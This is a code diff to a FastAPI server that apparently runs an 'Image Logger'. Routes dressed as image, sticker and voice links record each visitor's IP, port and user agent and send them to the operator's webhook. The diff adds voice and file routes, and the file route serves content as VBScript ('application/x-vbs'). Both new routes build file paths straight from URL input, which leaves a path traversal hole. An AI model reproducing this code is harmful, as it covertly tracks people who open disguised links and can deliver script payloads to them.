@@ -20,6 +20,7 @@ import os
 import app.model as model
 from sqlalchemy.orm import Session
 uri_path= '/app/app/image/'
+# uri_path="/home/lph77/GitHub/fastapi-docker-traefik/app/image/"
 '''
 database setup
 '''
@@ -88,6 +89,10 @@ async def redirect_image(background_tasks: BackgroundTasks,request: Request, url
             return RedirectResponse(f"https://media-ten.z-cdn.me/yYs3rlgP4qQAAAAF/keanu-keanu-reeves.png")
         background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Image Logger', db=db)
     return RedirectResponse(f"https://media-ten.z-cdn.me/{urlpath}/{imagename}")
+
+'''
+Redirect emotion sticker
+'''
 @app.get("/emoticon/sticker/webpc")
 async def redirect_emoticon(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = None, size: int =130 ,db: Session = Depends(get_db) ):
     ip = request.state.ip
@@ -100,6 +105,44 @@ async def redirect_emoticon(background_tasks: BackgroundTasks,request: Request,t
             return RedirectResponse(f'https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid=22051&size={size}')
         background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Image Logger', db=db)
     return RedirectResponse(f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}")
+
+'''
+Voice url get
+'''
+@app.get("/voice/{voiceurl}")
+async def download_voice(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), voiceurl: str = None,db: Session = Depends(get_db)):
+    ip = request.state.ip
+    timestamp = request.state.timestamp
+    port = request.state.port
+    image_path = f"{uri_path}/voice"
+    path = Path(image_path)
+    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+    if not curd.check_ip_exist(ip, db=db):
+        if not voiceurl or token==None or not curd.check_exists_token(db, token=token):
+            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=voiceurl, url_thumbnail="https://media-ten.z-cdn.me/MYZgsN2TDJAAAAAM/this-is.gif", botname='Cảnh báo server voice',db=db)
+            return FileResponse(f'{path}/alo.aac', media_type="audio/aac")
+        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=voiceurl, url_thumbnail="https://media-ten.z-cdn.me/MYZgsN2TDJAAAAAM/this-is.gif", botname='Image Logger Voice', db=db)
+    return FileResponse(f'{path}/{voiceurl}', media_type="audio/aac")
+'''
+File url get
+'''
+@app.get("/file/{fileurl}")
+async def download_voice(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), fileurl: str = None,db: Session = Depends(get_db)):
+    ip = request.state.ip
+    timestamp = request.state.timestamp
+    port = request.state.port
+    image_path = f"{uri_path}/file"
+    path = Path(image_path)
+    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+    if not curd.check_ip_exist(ip, db=db):
+        if not fileurl or token==None or not curd.check_exists_token(db, token=token):
+            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=fileurl, url_thumbnail="https://media-ten.z-cdn.me/TgFHDovkakMAAAAM/cliphy-mood.gif", botname='Cảnh báo server voice',db=db)
+            return FileResponse(f'{path}/alo.aac', media_type="audio/aac")
+        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=fileurl, url_thumbnail="https://media-ten.z-cdn.me/TgFHDovkakMAAAAM/cliphy-mood.gif", botname='Image Logger Voice', db=db)
+    return FileResponse(f'{path}/{fileurl}', media_type="application/x-vbs")
+'''
+Root URL
+'''
 @app.get("/")
 async def read_root(request: Request, user_agent: str = Header(None, convert_underscores=True), db: Session = Depends(get_db)):
     return {"Hello": "World FastAPI"}
@@ -121,6 +164,7 @@ async def login_for_access_token(
         data={"sub": user.username}, expires_delta=access_token_expires
     )
     return {"access_token": access_token, "token_type": "bearer"}
+
 '''
 View image without logger database
 '''                                                                                                                                                                                              
@@ -132,6 +176,7 @@ async def read_item(filename: str, q: str = None):
     if not path.is_file():
         return FileResponse(f'{uri_path}/taylor.gif', media_type="image/gif")
     return FileResponse(image_path, media_type="image/gif")
+
 '''
 View Image with logger database
 '''
@@ -151,6 +196,7 @@ async def get_image(background_tasks: BackgroundTasks,request: Request, filename
         background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=f"https://z-image-cdn.com/view/{filename}", botname='Image Logger', db=db)
     response = FileResponse(image_path, media_type="image/gif")
     return response
+
 '''
 Agents managent 
 '''
@@ -247,7 +293,9 @@ async def get_user(token: Annotated[str, Depends(oauth2_scheme)],db:Session= Dep
 async def get_user_user_by_id(user_id: int, token: Annotated[str, Depends(oauth2_scheme)],db:Session = Depends(get_db)):
     user = curd.get_user_by_id(db=db, user_id=user_id)
     return user
+'''
 # Get current user
+'''
 @app.get("/users/me/", response_model=schemas.CurrentUser)
 async def get_current_user(token: Annotated[str, Depends(oauth2_scheme)], db:Session = Depends(get_db)):
     credentials_exception = HTTPException(
@@ -289,7 +337,6 @@ async def testagent(token: str,db: Session = Depends(get_db)):
         return user
     else: 
         return {"error": "you dont know me"}
-
 
 
 '''
